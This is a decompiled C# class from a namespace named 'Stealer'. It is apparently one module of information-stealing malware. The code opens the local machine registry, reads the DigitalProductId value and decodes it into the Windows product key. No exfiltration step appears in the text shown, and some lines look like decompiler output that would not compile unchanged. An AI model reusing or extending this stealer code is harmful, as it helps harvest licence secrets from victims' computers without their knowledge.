using System;
using Microsoft.Win32;

namespace Stealer
{
	// Token: 0x0200000F RID: 15
	internal class Windows
	{
		// Token: 0x06000044 RID: 68 RVA: 0x0000402C File Offset: 0x0000222C
		private static string ProductKey(byte[] digitalProductId)
		{
			string text = string.Empty;
			byte b = digitalProductId[66] / 6 & 1;
			digitalProductId[66] = ((digitalProductId[66] & 247) | (b & 2) * 4);
			int num = 0;
			for (int i = 24; i >= 0; i--)
			{
				int num2 = 0;
				for (int j = 14; j >= 0; j--)
				{
					num2 *= 256;
					num2 = (int)digitalProductId[j + 52] + num2;
					digitalProductId[j + 52] = (byte)(num2 / 24);
					num2 %= 24;
					num = num2;
				}
				text = "BCDFGHJKMPQRTVWXY2346789"[num2] + text;
			}
			string str = text.Substring(1, num);
			string str2 = text.Substring(num + 1, text.Length - (num + 1));
			text = str + "N" + str2;
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x00004118 File Offset: 0x00002318
		public static string GetProductKey()
		{
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
			if (Environment.Is64BitOperatingSystem)
			{
				registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
			}
			object value = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion").GetValue("DigitalProductId");
			if (value == null)
			{
				return "Failed to get DigitalProductId from registry";
			}
			byte[] digitalProductId = (byte[])value;
			return Windows.ProductKey(digitalProductId);
		}
	}
}
